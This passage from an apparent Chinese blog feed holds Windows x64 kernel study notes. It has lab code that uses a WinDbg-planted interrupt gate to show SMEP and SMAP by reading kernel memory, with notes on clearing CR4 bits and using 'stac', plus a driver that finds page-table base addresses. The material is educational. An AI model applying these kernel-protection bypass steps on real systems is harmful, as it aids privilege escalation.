    <content type="html"><![CDATA[<h1 id="ia-32e模式"><a class="markdownIt-Anchor" href="#ia-32e模式"></a> IA-32e模式</h1><h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2><h1 id="smep-smap"><a class="markdownIt-Anchor" href="#smep-smap"></a> SMEP &amp; SMAP</h1><h2 id="visual-studio配置"><a class="markdownIt-Anchor" href="#visual-studio配置"></a> Visual Studio配置</h2><ul><li>x64asm.asm<ul><li>属性-&gt;配置属性-&gt;常规-&gt;{从生成项中排除:<code>否</code> ^ 项类型:<code>自定义生成工具</code>}</li><li>属性-&gt;配置属性-&gt;自定义生成工具-&gt;{命令行:<code>ml64 /c %(filename).asm</code> ^ 输出:<code>%(filename).obj;%(Outputs)</code>}</li><li>确保asm可以和C文件进行混合编译</li></ul></li><li>项目配置<ul><li>属性-&gt;配置属性-&gt;链接器-&gt;常规-&gt;{启动增量链接:<code>否(/INCREMENTAL:NO)</code>}</li><li>属性-&gt;配置属性-&gt;C/C+±&gt;代码生成-&gt;{运行库:<code>多线程(/MT)</code>}</li><li>属性-&gt;配置属性-&gt;链接器-&gt;高级-&gt;{随机基址:<code>否</code> ^ 固定基址:<code>是</code> ^ 基址:<code>0x0000000100000000</code>}</li><li>固定基址是符合代码需要，正常来说并不需要</li></ul></li><li>解决方案生成<ul><li>x64生成解决方案</li></ul></li></ul><h2 id="smep"><a class="markdownIt-Anchor" href="#smep"></a> SMEP</h2><h3 id="code-2"><a class="markdownIt-Anchor" href="#code-2"></a> Code</h3><h4 id="x64asasm"><a class="markdownIt-Anchor" href="#x64asasm"></a> x64as.asm</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;x64asm.asm<br>option casemap:none<br><br>EXTERN x:qword<br><br>.DATA<br><br>.CODE<br><br>IntEntryPROC<br>iretq<br>IntEntryENDP<br><br>goPROC<br>int 21h<br>ret<br>goENDP<br><br>END<br></code></pre></td></tr></table></figure><h4 id="testc"><a class="markdownIt-Anchor" href="#testc"></a> test.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">//对于cpp文件，则是extern &quot;C&quot;…… 这里注意区分c与cpp的不同</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">IntEntry</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">go</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">extern</span> ULONG64 x;<br><br>ULONG64 x;<br><span class="hljs-comment">//构造中断门(IDT),使程序可以通过int 21h 进入IntEntry函数</span><br><span class="hljs-comment">//eq idtr+210 0000ee00`00101000</span><br><span class="hljs-comment">//eq idtr+218 1</span><br><span class="hljs-comment">//修改SMEP，Cr4的第20位清零</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span> ((ULONG64)IntEntry != <span class="hljs-number">0x0000000100001000</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong IntEntry at %p \n&quot;</span>, IntEntry);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br>go();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p \n&quot;</span>, x);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="smap"><a class="markdownIt-Anchor" href="#smap"></a> SMAP</h2><h3 id="code-3"><a class="markdownIt-Anchor" href="#code-3"></a> Code</h3><h4 id="x64asasm-2"><a class="markdownIt-Anchor" href="#x64asasm-2"></a> x64as.asm</h4><ul><li><p>代码修改1</p><ul><li>自己把Cr4的第21位(SMAP)清零</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">IntEntryPROC<br>mov rax, qword ptr [0fffff8034b290fd0h];gdt[4]<br>mov x, rax<br>iretq<br>IntEntryENDP<br></code></pre></td></tr></table></figure></li><li><p>代码修改2</p><ul><li>使用 <code>stac</code> 将 <code>SMAP</code> 清零，但是只是运行时生效</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">IntEntryPROC<br>mov rax, qword ptr [0fffff8048528e000h]<br>stac;如果找不到这条指令，可以emit对应的字节码<br>mov x, rax<br>iretq<br>IntEntryENDP<br></code></pre></td></tr></table></figure></li></ul><h2 id="代码功能"><a class="markdownIt-Anchor" href="#代码功能"></a> 代码功能</h2><ul><li>对于<code>SMEP</code>与<code>SMAP</code>的存在检验，<code>test.c</code>主要就是构造函数执行的主窗口，<code>x64asm.asm</code>中则是对于相关函数进行实现</li><li>对于<code>x64asm.asm</code>文件<ul><li><code>go</code>函数主要实现通过中断门进入到内核，这里需要提前在<code>Windbg</code>中进行中断门构造</li><li><code>IntEntry</code>则在不同的验证代码中具体实现对于内核地址数据的访问与写入</li></ul></li></ul><h1 id="9-9-9-9-12分页"><a class="markdownIt-Anchor" href="#9-9-9-9-12分页"></a> 9-9-9-9-12分页</h1><h2 id="visual-studio配置-2"><a class="markdownIt-Anchor" href="#visual-studio配置-2"></a> Visual Studio配置</h2><ul><li>x64asm.asm<ul><li>属性-&gt;配置属性-&gt;常规-&gt;{从生成项中排除:<code>否</code> ^ 项类型:<code>自定义生成工具</code>}</li><li>属性-&gt;配置属性-&gt;自定义生成工具-&gt;{命令行:<code>ml64 /c %(filename).asm</code> ^ 输出:<code>%(filename).obj;%(Outputs)</code>}</li><li>确保asm可以和C文件进行混合编译</li></ul></li><li>项目配置<ul><li>删除项目中Driver Files中的文件</li><li>属性-&gt;配置属性-&gt;C/C+±&gt;常规-&gt;{将警告视为错误:<code>否</code>}</li><li>属性-&gt;配置属性-&gt;链接器-&gt;常规-&gt;{启动增量链接:<code>否(/INCREMENTAL:NO)</code>}</li><li>属性-&gt;配置属性-&gt;lnf2Cat-&gt;{Run lnf2Cat:<code>是</code>}</li><li>属性-&gt;配置属性-&gt;Driver Signing-&gt;{Sign Mode:<code>Off</code>}</li></ul></li><li>解决方案生成<ul><li>x64生成解决方案</li></ul></li></ul><h2 id="coda"><a class="markdownIt-Anchor" href="#coda"></a> Coda</h2><h3 id="entryc"><a class="markdownIt-Anchor" href="#entryc"></a> entry.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//entry.c-&gt;驱动的主函数和入口</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;common.h&quot;</span></span><br><br><span class="hljs-comment">//定义全局变量,这里需要定义asm与scan.c用到的变量</span><br>ULONG64 g_NT_BASE;<br>ULONG64 g_PTE_BASE;<br>ULONG64 g_PDE_BASE;<br>ULONG64 g_PPE_BASE;<br>ULONG64 g_PXE_BASE;<br>ULONG64 g_IDT;<br>ULONG64 g_Cr4;<br><br>VOID <span class="hljs-title function_">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span><br>&#123;<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Driver is unloading...\n----------------------------------------------\n&quot;</span>);<br>&#125;<br><br>NTSTATUS <span class="hljs-title function_">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT  driver, PUNICODE_STRING RegistryPath)</span><br>&#123;<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;----------------------------------------------\nDriver is loading  ...\n&quot;</span>);<br><br>    <span class="hljs-comment">//通过遍历模块匹配设置g_NT_BASE(nt模块的基址)的数据</span><br>    GetNtBaseAddress(driver);<br>    <span class="hljs-comment">//通过Nt模块首地址计算页表基址</span><br>    GetPageAddress(g_NT_BASE);<br><br>    driver-&gt;DriverUnload = DriverUnload;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="commomh"><a class="markdownIt-Anchor" href="#commomh"></a> commom.h</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//common.h-&gt;相关结构体的定义和函数的声明(包含asm文件的引用)</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> COMMON_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMON_H</span><br><br><span class="hljs-comment">//这里是用来遍历内核模块，从而找到NT模块的基地址</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LDR_DATA_TABLE_ENTRY</span> &#123;</span><br>    LIST_ENTRY InLoadOrderLinks;               <span class="hljs-comment">//链表存储，两个成员Flink(后)与Blink(前),指向一个LDR_DATA_TABLE_ENTRY结构</span><br>    LIST_ENTRY InMemoryOrderLinks;<br>    LIST_ENTRY InInitializationOrderLinks;<br>    PVOID DllBase;                             <span class="hljs-comment">//基址</span><br>    PVOID EntryPoint;<br>    ULONG SizeOfImage;<br>    UNICODE_STRING FullDllName;                <span class="hljs-comment">//完整模块名，以\??\格式(0环格式)开始</span><br>    UNICODE_STRING BaseDllName;                <span class="hljs-comment">//存放着驱动模块名</span><br>    ULONG Flags;<br>    USHORT LoadCount;<br>    USHORT TlsIndex;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        LIST_ENTRY HashLinks;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            PVOID SectionPointer;<br>            ULONG CheckSum;<br>        &#125;;<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            ULONG TimeDateStamp;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            PVOID LoadedImports;<br>        &#125;;<br>    &#125;;<br>&#125;LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;<br><br><span class="hljs-comment">//设置自定义函数，在scan.c中实现</span><br><span class="hljs-comment">//根据页表规则计算地址</span><br>PULONG64 <span class="hljs-title function_">GetPteAddress</span><span class="hljs-params">(PVOID addr)</span>;<br>PULONG64 <span class="hljs-title function_">GetPdeAddress</span><span class="hljs-params">(PVOID addr)</span>;<br>PULONG64 <span class="hljs-title function_">GetPpeAddress</span><span class="hljs-params">(PVOID addr)</span>;<br>PULONG64 <span class="hljs-title function_">GetPxeAddress</span><span class="hljs-params">(PVOID addr)</span>;<br><br><span class="hljs-comment">//根据页表分级获得地址</span><br>VOID <span class="hljs-title function_">GetPageAddress</span><span class="hljs-params">(ULONG64 g_NT_BASE)</span>;<br><span class="hljs-comment">//获得Nt模块的基址地址</span><br>VOID <span class="hljs-title function_">GetNtBaseAddress</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span>;<br><span class="hljs-comment">//线性地址转化为物理地址</span><br>VOID <span class="hljs-title function_">Address_translation</span><span class="hljs-params">()</span>;<br><br><span class="hljs-comment">//引用entry.c文件中的变量与函数</span><br><span class="hljs-keyword">extern</span> ULONG64 g_NT_BASE;<br><span class="hljs-keyword">extern</span> ULONG64 g_PTE_BASE;<br><span class="hljs-keyword">extern</span> ULONG64 g_PDE_BASE;<br><span class="hljs-keyword">extern</span> ULONG64 g_PPE_BASE;<br><span class="hljs-keyword">extern</span> ULONG64 g_PXE_BASE;<br><br><span class="hljs-comment">//引用asm文件中的变量与函数</span><br><span class="hljs-keyword">extern</span> ULONG64 g_Cr4;<br><span class="hljs-keyword">extern</span> ULONG64 g_IDT;<br><span class="hljs-keyword">extern</span> VOID <span class="hljs-title function_">Asm_Read_Cr4</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">extern</span> VOID <span class="hljs-title function_">Asm_Read_IDT</span><span class="hljs-params">()</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// COMMON_H</span></span><br><span class="hljs-comment">//#-&gt;这是一个预处理器指令，没有定义就创建宏，定义了就跳过，防止重复包含</span><br></code></pre></td></tr></table></figure><h3 id="scanc"><a class="markdownIt-Anchor" href="#scanc"></a> scan.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//scan.c-&gt;实现函数的定义</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;common.h&quot;</span></span><br><br><span class="hljs-comment">//根据线性地址得到物理地址</span><br>PULONG64 <span class="hljs-title function_">GetPxeAddress</span><span class="hljs-params">(PVOID addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (PULONG64)(((((ULONG64)addr &amp; <span class="hljs-number">0xffffffffffff</span>) &gt;&gt; <span class="hljs-number">39</span>) &lt;&lt; <span class="hljs-number">3</span>) + g_PXE_BASE);<br>&#125;<br>PULONG64 <span class="hljs-title function_">GetPpeAddress</span><span class="hljs-params">(PVOID addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (PULONG64)(((((ULONG64)addr &amp; <span class="hljs-number">0xffffffffffff</span>) &gt;&gt; <span class="hljs-number">30</span>) &lt;&lt; <span class="hljs-number">3</span>) + g_PPE_BASE);<br>&#125;<br>PULONG64 <span class="hljs-title function_">GetPdeAddress</span><span class="hljs-params">(PVOID addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (PULONG64)(((((ULONG64)addr &amp; <span class="hljs-number">0xffffffffffff</span>) &gt;&gt; <span class="hljs-number">21</span>) &lt;&lt; <span class="hljs-number">3</span>) + g_PDE_BASE);<br>&#125;<br>PULONG64 <span class="hljs-title function_">GetPteAddress</span><span class="hljs-params">(PVOID addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (PULONG64)(((((ULONG64)addr &amp; <span class="hljs-number">0xffffffffffff</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;&lt; <span class="hljs-number">3</span>) + g_PTE_BASE);<br>&#125;<br><br><br><span class="hljs-comment">//获取内核模块NT的基址与IDTR的基址</span><br>VOID <span class="hljs-title function_">GetNtBaseAddress</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span> &#123;<br>    PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="hljs-literal">NULL</span>;<br>    PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="hljs-literal">NULL</span>;<br>    UNICODE_STRING ModuleName = &#123; <span class="hljs-number">0</span> &#125;;<br>    RtlInitUnicodeString(&amp;ModuleName, <span class="hljs-string">L&quot;ntoskrnl.exe&quot;</span>);<br><br>    pLDR_Head = (PLDR_DATA_TABLE_ENTRY)driver-&gt;DriverSection;<br>    pLDR_Tail = pLDR_Head;<br><br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-keyword">if</span> (RtlCompareUnicodeString(&amp;pLDR_Tail-&gt;BaseDllName, &amp;ModuleName, TRUE) == <span class="hljs-number">0</span>) &#123;<br>            DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;NtModuleBase = %p \n&quot;</span>, pLDR_Tail-&gt;DllBase);<br>            g_NT_BASE = (ULONG64)pLDR_Tail-&gt;DllBase;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;<br>    &#125; <span class="hljs-keyword">while</span> (pLDR_Head != pLDR_Tail);<br><br>    <span class="hljs-comment">//DbgPrintEx(77, 0, &quot;NtModuleBase = %p \n&quot;, g_IDTR);</span><br>&#125;<br><br><span class="hljs-comment">//获取PTE等页表基址</span><br>VOID <span class="hljs-title function_">GetPageAddress</span><span class="hljs-params">(ULONG64 g_NT_BASE)</span> &#123;<br>    g_PTE_BASE = *(PULONG64)(g_NT_BASE + <span class="hljs-number">0xC8BC</span>);<br>    <span class="hljs-comment">//这里的0xC8BC是使用WinDbg搜索的PTE距离NT_BASE的偏移</span><br>    g_PDE_BASE = (ULONG64)GetPteAddress((PVOID)g_PTE_BASE);<br>    g_PPE_BASE = (ULONG64)GetPteAddress((PVOID)g_PDE_BASE);<br>    g_PXE_BASE = (ULONG64)GetPteAddress((PVOID)g_PPE_BASE);<br><br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Pte Base Address = %p\n&quot;</span>, (PVOID)g_PTE_BASE);<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Pde Base Address = %p\n&quot;</span>, (PVOID)g_PDE_BASE);<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Ppe Base Address = %p\n&quot;</span>, (PVOID)g_PPE_BASE);<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Pxe Base Address = %p\n&quot;</span>, (PVOID)g_PXE_BASE);<br><br>    <span class="hljs-comment">//为g_Cr4与g_IDT赋值</span><br>    Asm_Read_Cr4();<br>    Asm_Read_IDT();<br>    <span class="hljs-comment">//调整g_IDT为在WinDbg中的显示地址</span><br>    g_IDT = ((g_IDT) &gt;&gt; <span class="hljs-number">16</span>) | <span class="hljs-number">0xffff000000000000</span>;<br>    <span class="hljs-comment">//获取某一个线性地址所在的页面的页表地址(线性地址)</span><br>    ULONG64 terget_address = g_IDT;<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;g_IDT: %p\n&quot;</span>, (PVOID)g_IDT);<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;g_Cr4: %p\n&quot;</span>, (PVOID)g_Cr4);<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;PTE: %p\n&quot;</span>, GetPteAddress((PVOID)terget_address));<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;PDE: %p\n&quot;</span>, GetPdeAddress((PVOID)terget_address));<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;PPE: %p\n&quot;</span>, GetPpeAddress((PVOID)terget_address));<br>    DbgPrintEx(<span class="hljs-number">77</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;PXE: %p\n&quot;</span>, GetPxeAddress((PVOID)terget_address));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="x64asmasm"><a class="markdownIt-Anchor" href="#x64asmasm"></a> x64asm.asm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;x64asm.asm-&gt;实现64位c的混合汇编<br>option casemap:none<br><br>;结构体的定义,举个例子<br>IDTDescriptor STRUC  2<br>baseqword 0 <br>limitqword  0<br>IDTDescriptor ENDS<br><br>;这里的参数是引用的entry.c中的参数，所以在c代码中需要定义<br>EXTERN g_Cr4:qword<br>EXTERN g_IDT:qword<br><br>.DATA<br><br>.CODE<br><br>;获得Cr4的线性地址<br>Asm_Read_Cr4 PROC <br>mov rax,cr4<br>mov [g_Cr4],rax<br>ret<br>Asm_Read_Cr4 ENDP<br><br>;获取IDT的基址<br>Asm_Read_IDT PROC<br>sidt [g_IDT]<br>ret<br>Asm_Read_IDT ENDP<br><br>END<br></code></pre></td></tr></table></figure><h2 id="代码功能-2"><a class="markdownIt-Anchor" href="#代码功能-2"></a> 代码功能</h2><ul><li>对于9-9-9-9-12分页模式，这里在<code>entry.c</code>中进行相关模块的引用与注释介绍，在<code>scan.c</code>与<code>x64asm.asm</code>中实现相关函数的具体功能，在<code>commom.h</code>中实现相关结构体与变量的引用</li><li>这里简单讲解一下<code>scan.c</code>中实现的函数<ul><li>类<code>GetPteAddress</code>函数的功能就是根据基于页表基址的直接物理搜索的规则来进行公式的陈列。这里的<code>pte</code>就是在基址上左移12位–去掉后12位的物理属性，之后左移3位–乘以每个表项8位的长度，这样就得到了线性地址转换而来的它所属的<code>pte</code>地址(线性地址)</li><li><code>GetNtBaseAddress</code>则是获取了Nt模块的基址。这里对于本驱动中存储的<code>PLDR_DATA_TABLE_ENTRY pLDR_Head</code>链进行遍历，这个双向链表挂载着所有的驱动，由此经过驱动名称的比对找到相应的驱动，从而获得驱动的开始地址</li><li><code>GetPageAddress</code>则是根据Nt模块基址与相应公式，查找<code>pte</code>等表的<code>基址</code>(windbg中可以使用<code>!pte 0</code>查看)与计算线性地址的所属的页表地址。由于win10机制，每次开机的pte等基址会发生改变，所以需要对win10中Nt模块的源代码进行逆向，查找具体的偏移地址来查找pte等的基址。<ul><li>对于基址的查找都是使用<code>GetPteAddress</code>函数，这里可以理解为<strong>执行 PTE 所在物理页面的 PTE 是 PDE</strong>：就是说页表基址也是被一个PDT所指向的，所以可以根据页表地址来逆推出其他的基址。</li><li>这里同时根据某一个线性地址，实现了去查找它所属的pte,pde,ppe,pxe的页表开始地址</li><li>这里都是线性地址范畴，同时需要理解pte,pde,ppe,pxe的基址与地址的概念，它们都是一张张表构成的，基址指第一张表的开始地址，而地址指每一张表的开始地址</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VM保护攻防</title>
    <link href="/posts/6b79a6f5.html"/>
    <url>/posts/6b79a6f5.html</url>
    
    <content type="html"><![CDATA[<h1 id="vm保护攻防"><a class="markdownIt-Anchor" href="#vm保护攻防"></a> VM保护攻防</h1>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Win64_Kernel简述</title>
    <link href="/posts/9fe68f2a.html"/>
    <url>/posts/9fe68f2a.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>详细参考</p><ul><li><a href="https://lzyddf.blog.csdn.net/?type=blog">Windows x64内核学习笔记</a></li><li><a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467288">x64内核研究</a></li></ul></blockquote><h1 id="ia-32e模式"><a class="markdownIt-Anchor" href="#ia-32e模式"></a> IA-32e模式</h1><h2 id="前瞻"><a class="markdownIt-Anchor" href="#前瞻"></a> 